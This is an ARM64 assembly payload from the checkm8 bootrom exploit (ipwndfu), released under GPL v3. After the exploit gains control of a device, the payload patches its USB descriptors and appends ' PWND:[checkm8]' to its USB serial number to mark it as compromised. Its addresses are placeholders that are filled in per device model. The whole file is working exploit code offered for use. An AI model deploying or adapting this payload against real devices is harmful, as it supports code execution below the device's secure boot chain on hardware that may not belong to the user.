// Code from the original checkm8 exploit by axi0mX
// https://github.com/axi0mX/ipwndfu
// This code has been relesed under the GPL v3

.text

.pool
.set set_USBDescriptors,            0xbad00001
.set gUSBDescriptors,               0xbad00002
.set gUSBSerialNumber,              0xbad00003
.set usb_create_string_descriptor,  0xbad00004
.set gUSBSRNMStringDescriptor,      0xbad00005

.global _main
_main:
  //mov   x19, #0                      // HACK: do not free this usb request
  stp   x29, x30, [sp, #-0x10]!
  mov   x29, sp

  ldr   x0, =set_USBDescriptors
  cmp   x0, #1
  bne   _set_srnm                   // Do not set USB Descriptors anymore, this will cause a crash on t8011 (and maybe others)]

_set_USBDescriptors:
  ldr   x0, =gUSBDescriptors
  ldp   x0, x1, [x0]
  adr   x2, USB_DESCRIPTOR
  ldp   x3, x4, [x2]
  stp   x3, x4, [x0]
  stp   x3, x4, [x1]
  ldp   x3, x4, [x2, #0x10]
  stp   x3, x4, [x0, #0x10]
  stp   x3, x4, [x1, #0x10]

_set_srnm:
  ldr   x0, =gUSBSerialNumber
_find_zero_loop:
  add   x0, x0, #1
  ldrb  w1, [x0]
  cbnz  w1, _find_zero_loop

  adr   x1, PWND_STRING
  ldp   x2, x3, [x1]
  stp   x2, x3, [x0]

  ldr   x0, =gUSBSerialNumber
  ldr   x1, =usb_create_string_descriptor
  blr   x1

  ldr   x1, =gUSBSRNMStringDescriptor
  strb  w0, [x1]

_end:
  ic    iallu
  dsb   sy
  isb

  ldp   x29, x30, [sp], #0x10
  ret

USB_DESCRIPTOR:
.word 0x190209, 0x80050101, 0x409fa, 0x1fe0000, 0x21070000, 0xa01, 0x8, 0x0

PWND_STRING:
.asciz " PWND:[checkm8]"
